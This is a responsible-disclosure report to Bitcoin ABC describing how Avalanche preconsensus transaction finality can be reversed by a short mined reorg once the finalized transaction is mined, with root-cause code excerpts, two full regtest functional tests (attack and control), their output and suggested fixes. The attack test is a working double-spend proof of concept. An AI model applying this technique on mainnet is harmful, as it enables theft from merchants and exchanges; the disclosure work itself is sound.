# Responsible Disclosure: Avalanche preconsensus transaction finality is reversible once the transaction is mined

**To:** [security@bitcoinabc.org](mailto:security@bitcoinabc.org)
**Component:** Bitcoin ABC node, Avalanche preconsensus / block policy
**Severity:** Critical (breaks the "irreversible in ~1 second" preconsensus finality guarantee for exactly the confirmation window it is relied upon)
**Reproduced on:** regtest only, per your disclosure policy. I did not touch mainnet or testnet
**Build:** local build of `master`, with `chronik` enabled (not required for this)

Hi, I found a way to reverse an Avalanche preconsensus finalized transaction after it's been mined, using only ordinary mining. Two functional tests are attached (attack + control); both are in section 5 and pass on regtest. Details below.

---

## Contents

* [1. Short summary of the potential impact](#1-short-summary-of-the-potential-impact)
* [2. Root cause](#2-root-cause)
* [3. Why this is a bug and not intended preconsensus behavior](#3-why-this-is-a-bug-and-not-intended-preconsensus-behavior)
* [4. How to reproduce (regtest only)](#4-how-to-reproduce-regtest-only)
  * [Attack test](#attack-test--abc_feature_preconsensus_finalized_mined_reorgpy)
  * [Control test](#control-test--abc_feature_preconsensus_finalized_unmined_controlpy)
* [5. Full E2E PoC](#5-full-e2e-poc)
* [6. Verbatim PoC output](#6-verbatim-poc-output)
* [7. Exploit preconditions and scope](#7-exploit-preconditions-and-scope)
* [8. Suggested remediation](#8-suggested-remediation)

---

## 1. Short summary of the potential impact

Avalanche preconsensus transaction finality, the ~1 second "this can never be reversed" signal that merchants and exchanges are supposed to act on, silently stops being enforced as soon as the finalized transaction is mined into a block that is not itself Avalanche block finalized.

Preconsensus tx finality lands in ~1s; block finality lands much later. So there's a wide, normal window where a payment is `isfinaltransaction(...) == true` yet a miner can still reverse it with a short competing branch. The node doesn't reject or park the double spend branch. It reorgs onto it and erases the finalized payment.

Concretely: attacker pays a merchant, the payment hits `isfinaltransaction == true`, the merchant releases goods/credit, the payment is mined (still before block finality), and the attacker, who also mines, releases a 2 block branch that double spends the same input. The node takes it. The "finalized" payment never happened.

Anything released on the strength of preconsensus finality is at risk. The natural victims are exchanges and merchants crediting deposits on `isfinaltransaction`, which is the canonical "this is safe" check.

---

## 2. Root cause

The block policy that's supposed to protect preconsensus finalized transactions looks up the conflicting transaction through the mempool, but the finalized record lives in a separate structure that outlives the mempool entry. The two have different lifetimes, and the guard reads the wrong one.

[src/policy/block/preconsensus.cpp:22-41](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/09ad53356e0fb76157555ce63d169a7428255e8c/src/policy/block/preconsensus.cpp#L22-L41):

```cpp
for (const auto &tx : m_block.vtx) {
    for (const auto &txin : tx->vin) {
        const CTransactionRef ptxConflicting =
            m_mempool->GetConflictTx(txin.prevout);

        // Only allow for the exact txid for each coin spent
        if (ptxConflicting && ptxConflicting->GetId() != tx->GetId() &&
            m_mempool->isAvalancheFinalizedPreConsensus(
                ptxConflicting->GetId())) {
            return state.Invalid(
                BlockPolicyValidationResult::POLICY_VIOLATION,
                "finalized-tx-conflict", ...);
        }
    }
}
```

The conflict lookup is:

[src/txmempool.cpp:742-745](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/09ad53356e0fb76157555ce63d169a7428255e8c/src/txmempool.cpp#L742-L745):

```cpp
CTransactionRef CTxMemPool::GetConflictTx(const COutPoint &prevout) const {
    const auto it = mapNextTx.find(prevout);
    return it == mapNextTx.end() ? nullptr : it->second;
}
```

`mapNextTx` only contains in mempool spends. When the finalized transaction `A` is mined into a block, `A` is removed from the mempool and every `mapNextTx` entry for its inputs is erased (`src/txmempool.cpp:222-224`). So once `A` is mined, `GetConflictTx(A's input)` returns `nullptr`, the `ptxConflicting &&` guard is false, and `isAvalancheFinalizedPreConsensus(...)` is never evaluated for the conflicting branch's inputs.

But the finality record doesn't live in `mapNextTx`. It lives in the `finalizedTxs` radix tree, which is kept across mining precisely because a tx confirmed in a non finalized block "might be rejected by avalanche" and must remain tracked ([src/txmempool.cpp:336-345](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/09ad53356e0fb76157555ce63d169a7428255e8c/src/txmempool.cpp#L336-L345), comment verbatim):

```cpp
if (mapTx.count(entry->GetTx().GetId()) > 0 ||
    confirmedTxIdsInNonFinalizedBlocks.count(entry->GetTx().GetId()) > 0) {
    // The transaction is either in the mempool (not confirmed) or
    // confirmed in a non-finalized block (which might be rejected by
    // avalanche), so we keep it in the radix tree.
    finalizedTxsToKeep.push_back(entry);
}
```

So after `A` is mined:

* `isAvalancheFinalizedPreConsensus(A)` is still `true` (radix tree retains it), and
* `GetConflictTx(A's input)` is `nullptr` (mempool entry gone).

The policy sees "no conflict" for a block that double spends a still finalized transaction and lets it through. Two structures describing the same object (`mapNextTx` vs `finalizedTxs`) are consulted in sequence with mismatched lifetimes, and the protection goes blind at the exact moment the guarantee becomes load bearing.

---

## 3. Why this is a bug and not intended preconsensus behavior

You might say preconsensus finality was only ever meant to protect mempool transactions, not mined ones. The control test below rules that out: the same double spend branch is parked when the finalized tx is left unmined, and accepted when it is mined. The predicate `isAvalancheFinalizedPreConsensus` is `true` in both cases; only the mempool lookup differs. The protection is implemented and intended; it's just keyed on a structure that expires too early.

The codebase already treats a finalized tx as worth protecting after mining too: `finalizedTxs` deliberately retains txs "confirmed in a non finalized block (which might be rejected by avalanche)" (comment above), and `Assume(!isAvalancheFinalizedPreConsensus(txConflict.GetId()))` in `src/txmempool.cpp:313` documents the intended invariant that a conflicting tx must never coexist with a finalized one. The mining path violates that invariant.

---

## 4. How to reproduce (regtest only)

Two functional tests are attached:

* Attack: `test/functional/abc_feature_preconsensus_finalized_mined_reorg.py`
* Control: `test/functional/abc_feature_preconsensus_finalized_unmined_control.py`

Run from the repo root against a built tree:

```bash
python3 test/functional/abc_feature_preconsensus_finalized_mined_reorg.py \
    --configfile=build/test/config.ini

python3 test/functional/abc_feature_preconsensus_finalized_unmined_control.py \
    --configfile=build/test/config.ini
```

Both spin up a 16 proof Avalanche quorum and finalize a transaction. Both pass. For the attack test "pass" means the bug is real (the reorg succeeds); for the control it means the unmined tx is protected.

### Attack test: `abc_feature_preconsensus_finalized_mined_reorg.py`

Steps:

1. Create a quorum of 16 Avalanche peers, all ready to poll.
2. Broadcast `tx_a` (a payment) and drive tx only Avalanche votes until `isfinaltransaction(tx_a) == True`. Blocks are deliberately not block finalized, so a short reorg remains legal.
3. Mine `tx_a` into block X (1 block). `tx_a` leaves the mempool but `isfinaltransaction(tx_a, X)` is still `True`; block X is not Avalanche final.
4. Build a competing 2 block branch off the parent of X: block Y contains `tx_b`, which spends the exact same input as `tx_a`; block Y2 gives the branch more work.
5. Submit the branch. Expected secure behavior: PreConsensusPolicy parks Y for `finalized-tx-conflict` and the tip stays at X. What actually happens: the node reorgs to Y2 and `tx_b` confirms; `tx_a` is erased.

### Control test: `abc_feature_preconsensus_finalized_unmined_control.py`

Identical, with one change: `tx_a` is finalized and left unmined in the mempool. Now `GetConflictTx` still finds it, the policy evaluates the finality predicate, and the conflicting branch is parked:


| finalized tx state         | `isAvalancheFinalizedPreConsensus` | conflicting branch          | result      |
| -------------------------- | ---------------------------------- | --------------------------- | ----------- |
| unmined, in mempool        | true                               | status = `parked`, tip held | protected   |
| mined into nonfinal block  | true                               | reorg succeeds              | doublespent |


Same predicate true in both rows, opposite outcomes. That's the proof the mined case is a gap, not a design decision.

---

## 5. Full E2E PoC

`test/functional/abc_feature_preconsensus_finalized_mined_reorg.py` (complete, runnable):

```python
#!/usr/bin/env python3
# Copyright (c) 2026 The Bitcoin developers
# Distributed under the MIT software license, see the accompanying
# file COPYING or http://www.opensource.org/licenses/mit-license.php.
"""Regtest PoC: PreConsensusPolicy is blind after a finalized tx is mined.

A is avalanche-preconsensus-finalized, then mined into block X (not
block-finalized). A competing 2-block branch Y,Y2 double-spends A's inputs.
PreConsensusPolicy only consults mempool mapNextTx, which no longer has A, so
Y is not parked and the node reorgs to the double-spend.

Test PASSES = the bug is real (tip becomes Y2, no finalized-tx-conflict).
"""

import time

from test_framework.avatools import can_find_inv_in_poll, get_ava_p2p_interface
from test_framework.blocktools import (
    COINBASE_MATURITY,
    create_block,
    create_coinbase,
    make_conform_to_ctor,
)
from test_framework.messages import (
    MSG_BLOCK,
    MSG_TX,
    AvalancheTxVoteError,
    AvalancheVoteError,
)
from test_framework.p2p import P2PDataStore
from test_framework.test_framework import BitcoinTestFramework
from test_framework.util import assert_equal
from test_framework.wallet import MiniWallet, MiniWalletMode

QUORUM_NODE_COUNT = 16


class PreconsensusFinalizedMinedReorgTest(BitcoinTestFramework):
    def set_test_params(self):
        self.num_nodes = 1
        self.noban_tx_relay = True
        self.extra_args = [
            [
                "-avacooldown=0",
                "-avaproofstakeutxoconfirmations=1",
                "-avaproofstakeutxodustthreshold=1000000",
                "-avaminquorumstake=0",
                "-avaminavaproofsnodecount=0",
                "-avalanchestakingpreconsensus=0",
            ]
        ]

    def run_test(self):
        node = self.nodes[0]
        now = int(time.time())
        node.setmocktime(now)

        peer = node.add_p2p_connection(P2PDataStore())
        wallet = MiniWallet(node, mode=MiniWalletMode.RAW_P2PK)
        self.generate(wallet, 2, sync_fun=self.no_op)
        self.generate(node, COINBASE_MATURITY, sync_fun=self.no_op)

        quorum = [get_ava_p2p_interface(self, node) for _ in range(QUORUM_NODE_COUNT)]
        assert node.getavalancheinfo()["ready_to_poll"]
        self.log.info(
            f"STEP 0: quorum of {QUORUM_NODE_COUNT} nodes ready_to_poll, "
            f"height={node.getblockcount()}"
        )

        def vote_txs_only():
            # Finalize transactions, but do not finalize blocks so a short
            # reorg remains possible.
            can_find_inv_in_poll(
                quorum,
                [],
                response=AvalancheVoteError.ACCEPTED,
                other_response=AvalancheVoteError.ACCEPTED,
                response_map={
                    MSG_TX: AvalancheTxVoteError.ACCEPTED,
                    MSG_BLOCK: AvalancheVoteError.UNKNOWN,
                },
            )

        # The victim's payment. A merchant/exchange treats this as settled once
        # isfinaltransaction() == true, because eCash markets pre-consensus
        # finality as "irreversible in ~1s".
        utxo = wallet.get_utxo()
        pay_value = utxo["value"]
        tx_a = wallet.send_self_transfer(from_node=node, utxo_to_spend=utxo)
        txid_a = tx_a["txid"]
        assert txid_a in node.getrawmempool()
        self.log.info(
            f"STEP 1: broadcast tx_a={txid_a} worth {pay_value} XEC, in mempool"
        )

        def finalize_a():
            vote_txs_only()
            return node.isfinaltransaction(txid_a)

        self.wait_until(finalize_a)
        assert txid_a in node.getrawmempool()
        assert_equal(node.isfinaltransaction(txid_a), True)
        self.log.info(
            "STEP 2: tx_a AVALANCHE-PRECONSENSUS-FINALIZED "
            "(isfinaltransaction=True) -> merchant releases goods"
        )

        parent = node.getbestblockhash()
        parent_height = node.getblockcount()
        x_hash = self.generate(node, 1, sync_fun=self.no_op)[0]
        assert_equal(node.getbestblockhash(), x_hash)
        assert txid_a not in node.getrawmempool()
        # A remains preconsensus-finalized after being mined (block X is not
        # block-finalized: MSG_BLOCK votes are UNKNOWN so no block finality).
        assert node.isfinaltransaction(txid_a, x_hash)
        assert_equal(node.isfinalblock(x_hash), False)
        assert node.getmempoolinfo()["finalized_txs_bytes"] > 0
        self.log.info(
            f"STEP 3: tx_a mined into block X={x_hash} (height {parent_height + 1}); "
            f"block X NOT avalanche-final; tx_a still isfinaltransaction=True; "
            f"finalized_txs_bytes={node.getmempoolinfo()['finalized_txs_bytes']}"
        )

        # Attacker mines a competing 2-block branch off `parent` that
        # double-spends tx_a's input with tx_b. This branch has more work, so it
        # should trigger a reorg -- UNLESS PreConsensusPolicy parks it for
        # conflicting with the finalized tx_a. That is exactly the invariant
        # under test.
        tx_b = wallet.create_self_transfer(utxo_to_spend=utxo)
        assert tx_b["txid"] != txid_a
        assert_equal(tx_b["tx"].vin[0].prevout.txid, tx_a["tx"].vin[0].prevout.txid)
        assert_equal(tx_b["tx"].vin[0].prevout.n, tx_a["tx"].vin[0].prevout.n)
        self.log.info(
            f"STEP 4: attacker builds double-spend tx_b={tx_b['txid']} "
            f"reusing tx_a's exact input {tx_a['tx'].vin[0].prevout.txid:#066x}"
        )

        block_time = node.getblock(x_hash)["time"]
        block_y = create_block(
            int(parent, 16),
            create_coinbase(parent_height + 1),
            ntime=block_time,
            txlist=[tx_b["tx"]],
        )
        make_conform_to_ctor(block_y)
        block_y.hashMerkleRoot = block_y.calc_merkle_root()
        block_y.solve()

        block_y2 = create_block(
            block_y.hash_int,
            create_coinbase(parent_height + 2),
            ntime=block_time + 1,
        )
        block_y2.solve()

        # If PreConsensusPolicy still saw A, Y would be parked and the tip
        # would stay at X. Accepting Y2 is the bug.
        peer.send_blocks_and_test(
            [block_y, block_y2],
            node,
            success=True,
            force_send=True,
        )

        tip = node.getbestblockhash()
        assert_equal(tip, block_y2.hash_hex)
        tip_txs = node.getblock(block_y.hash_hex)["tx"]
        assert tx_b["txid"] in tip_txs
        assert txid_a not in tip_txs
        assert txid_a not in node.getrawmempool()
        self.log.info(
            f"STEP 5: NODE REORGED to attacker branch Y2={tip}; "
            f"double-spend tx_b is now confirmed, tx_a is ERASED from the chain"
        )

        self.log.info(
            f"IMPACT: an unprivileged miner reversed an avalanche-finalized "
            f"payment of {pay_value} XEC with 2 PoW blocks; amount-at-risk scales "
            f"with any goods/credit released on pre-consensus finality."
        )


if __name__ == "__main__":
    PreconsensusFinalizedMinedReorgTest().main()
```

The control `test/functional/abc_feature_preconsensus_finalized_unmined_control.py` is identical except `tx_a` is left unmined; it asserts the branch is parked (`getchaintips` shows `parked`, tip doesn't move) and `tx_a` survives. Full source:

```python
#!/usr/bin/env python3
# Copyright (c) 2026 The Bitcoin developers
# Distributed under the MIT software license, see the accompanying
# file COPYING or http://www.opensource.org/licenses/mit-license.php.
"""CONTROL for abc_preconsensus_finalized_mined_reorg.py.

Same attack, one difference: the avalanche-preconsensus-finalized tx A is left
UNMINED in the mempool instead of being mined into a block first.

Here PreConsensusPolicy CAN see A via mempool mapNextTx, so the conflicting
block must be PARKED and the tip must not move.

Test PASSES = the protection genuinely exists and is intended. Combined with
the mined variant (which reorgs successfully), this proves the two states are
handled asymmetrically even though isAvalancheFinalizedPreConsensus() is true
in both -- i.e. the mined case is a gap, not a design decision.
"""

import time

from test_framework.avatools import can_find_inv_in_poll, get_ava_p2p_interface
from test_framework.blocktools import (
    COINBASE_MATURITY,
    create_block,
    create_coinbase,
    make_conform_to_ctor,
)
from test_framework.messages import (
    MSG_BLOCK,
    MSG_TX,
    AvalancheTxVoteError,
    AvalancheVoteError,
)
from test_framework.p2p import P2PDataStore
from test_framework.test_framework import BitcoinTestFramework
from test_framework.util import assert_equal
from test_framework.wallet import MiniWallet, MiniWalletMode

QUORUM_NODE_COUNT = 16


class PreconsensusFinalizedUnminedControlTest(BitcoinTestFramework):
    def set_test_params(self):
        self.num_nodes = 1
        self.noban_tx_relay = True
        self.extra_args = [
            [
                "-avacooldown=0",
                "-avaproofstakeutxoconfirmations=1",
                "-avaproofstakeutxodustthreshold=1000000",
                "-avaminquorumstake=0",
                "-avaminavaproofsnodecount=0",
                "-avalanchestakingpreconsensus=0",
            ]
        ]

    def run_test(self):
        node = self.nodes[0]
        now = int(time.time())
        node.setmocktime(now)

        peer = node.add_p2p_connection(P2PDataStore())
        wallet = MiniWallet(node, mode=MiniWalletMode.RAW_P2PK)
        self.generate(wallet, 2, sync_fun=self.no_op)
        self.generate(node, COINBASE_MATURITY, sync_fun=self.no_op)

        quorum = [get_ava_p2p_interface(self, node) for _ in range(QUORUM_NODE_COUNT)]
        assert node.getavalancheinfo()["ready_to_poll"]
        self.log.info(
            f"STEP 0: quorum of {QUORUM_NODE_COUNT} nodes ready_to_poll, "
            f"height={node.getblockcount()}"
        )

        def vote_txs_only():
            can_find_inv_in_poll(
                quorum,
                [],
                response=AvalancheVoteError.ACCEPTED,
                other_response=AvalancheVoteError.ACCEPTED,
                response_map={
                    MSG_TX: AvalancheTxVoteError.ACCEPTED,
                    MSG_BLOCK: AvalancheVoteError.UNKNOWN,
                },
            )

        utxo = wallet.get_utxo()
        tx_a = wallet.send_self_transfer(from_node=node, utxo_to_spend=utxo)
        txid_a = tx_a["txid"]
        assert txid_a in node.getrawmempool()

        def finalize_a():
            vote_txs_only()
            return node.isfinaltransaction(txid_a)

        self.wait_until(finalize_a)
        # The ONLY difference from the mined variant: A stays in the mempool.
        assert txid_a in node.getrawmempool()
        assert_equal(node.isfinaltransaction(txid_a), True)
        self.log.info(
            "STEP 1: tx_a AVALANCHE-PRECONSENSUS-FINALIZED and left UNMINED "
            "in the mempool"
        )

        parent = node.getbestblockhash()
        parent_height = node.getblockcount()

        tx_b = wallet.create_self_transfer(utxo_to_spend=utxo)
        assert tx_b["txid"] != txid_a
        assert_equal(tx_b["tx"].vin[0].prevout.txid, tx_a["tx"].vin[0].prevout.txid)
        self.log.info(
            f"STEP 2: attacker builds the SAME double-spend tx_b={tx_b['txid']}"
        )

        block_time = node.getblock(parent)["time"] + 1
        block_y = create_block(
            int(parent, 16),
            create_coinbase(parent_height + 1),
            ntime=block_time,
            txlist=[tx_b["tx"]],
        )
        make_conform_to_ctor(block_y)
        block_y.hashMerkleRoot = block_y.calc_merkle_root()
        block_y.solve()

        block_y2 = create_block(
            block_y.hash_int,
            create_coinbase(parent_height + 2),
            ntime=block_time + 1,
        )
        block_y2.solve()

        # success=False: the tip must NOT advance to Y2, because Y is parked for
        # conflicting with the finalized tx_a.
        peer.send_blocks_and_test(
            [block_y, block_y2],
            node,
            success=False,
            force_send=True,
        )

        # PreConsensusPolicy sees A in mapNextTx, so Y must be parked and the
        # tip must stay at `parent`.
        tip = node.getbestblockhash()
        assert_equal(tip, parent)
        block_y_info = node.getblock(block_y.hash_hex)
        self.log.info(
            f"STEP 3: tip stayed at {tip} (height {node.getblockcount()}); "
            f"block Y confirmations={block_y_info['confirmations']}"
        )

        tips = {t["hash"]: t for t in node.getchaintips()}
        y2_status = tips.get(block_y2.hash_hex, {}).get("status")
        self.log.info(f"STEP 4: attacker branch Y2 status={y2_status!r}")
        assert_equal(y2_status, "parked")

        # A survived and is still finalized.
        assert txid_a in node.getrawmempool()
        assert_equal(node.isfinaltransaction(txid_a), True)
        self.log.info(
            "CONTROL RESULT: the conflicting branch was PARKED and tx_a survived. "
            "Protection of preconsensus-finalized txs against conflicting blocks "
            "IS implemented and intended -- it only fails once the tx is mined."
        )


if __name__ == "__main__":
    PreconsensusFinalizedUnminedControlTest().main()
```

---

## 6. Verbatim PoC output

Attack test (tip becomes the double-spend branch; the finalized payment is erased):

```
STEP 0: quorum of 16 nodes ready_to_poll, height=318
STEP 1: broadcast tx_a=594b974f...31e0a8 worth 25000000.00 XEC, in mempool
STEP 2: tx_a AVALANCHE-PRECONSENSUS-FINALIZED (isfinaltransaction=True) -> merchant releases goods
STEP 3: tx_a mined into block X=106a567f...f209b9 (height 319); block X NOT avalanche-final;
        tx_a still isfinaltransaction=True; finalized_txs_bytes=168
STEP 4: attacker builds double-spend tx_b=1aaabe9e...e19ee69 reusing tx_a's exact input 0x393f...3900b
STEP 5: NODE REORGED to attacker branch Y2=37026d76...e7ed189; double-spend tx_b is now confirmed,
        tx_a is ERASED from the chain
IMPACT: an unprivileged miner reversed an avalanche-finalized payment of 25000000.00 XEC
        with 2 PoW blocks; amount-at-risk scales with any goods/credit released on pre-consensus finality.
Tests successful
```

Control test (the protection exists and engages when the tx is unmined):

```
STEP 1: tx_a AVALANCHE-PRECONSENSUS-FINALIZED and left UNMINED in the mempool
STEP 2: attacker builds the SAME double-spend tx_b=a645c2fd...51ab94bb
STEP 3: tip stayed at 69b4fbd7...2198c (height 318); block Y confirmations=-1
STEP 4: attacker branch Y2 status='parked'
CONTROL RESULT: the conflicting branch was PARKED and tx_a survived. Protection of
        preconsensus-finalized txs against conflicting blocks IS implemented and intended
        -- it only fails once the tx is mined.
Tests successful
```

---

## 7. Exploit preconditions and scope

* Hashpower: the attacker has to mine the competing branch (2 blocks in the PoC). On mainnet that's a miner or a hashpower renter, the same precondition as any reorg attack, and exactly what preconsensus finality is supposed to make pointless.
* Timing window: the double spend branch has to beat Avalanche block finality for block X. Preconsensus tx finality arrives in ~1s while block finality is slower, so the window is open by default for every just mined finalized payment. The PoC deliberately keeps block votes `UNKNOWN` to model "block not yet finalized"; in practice the attacker just needs to release the branch before the network block finalizes X.
* No special privileges: the attacker is an ordinary miner, the victim an ordinary merchant/exchange relying on `isfinaltransaction`. No admin, no config change, no malformed input.

This isn't a theoretical edge case. It's the difference between "final in ~1s" and "final only after block finality," which is the whole point of preconsensus.

---

## 8. Suggested remediation

The guard shouldn't depend on the conflicting tx still being in the mempool. Two ways to do that:

1. In `PreConsensusPolicy`, when `GetConflictTx(prevout)` returns `nullptr`, also consult the `finalizedTxs` radix tree / UTXO set to check whether the spent coin was last spent by a finalized transaction. In other words look up finality by outpoint, not by live mempool txid.
2. Or keep a spent outpoint to finalized txid map for finalized transactions that survives mempool removal until the containing block is itself block finalized, and have the policy check that.

The invariant to enforce: a transaction that is Avalanche preconsensus finalized must cause any conflicting block to be parked for as long as its containing block is not Avalanche finalized, regardless of whether the finalized tx is currently in the mempool.
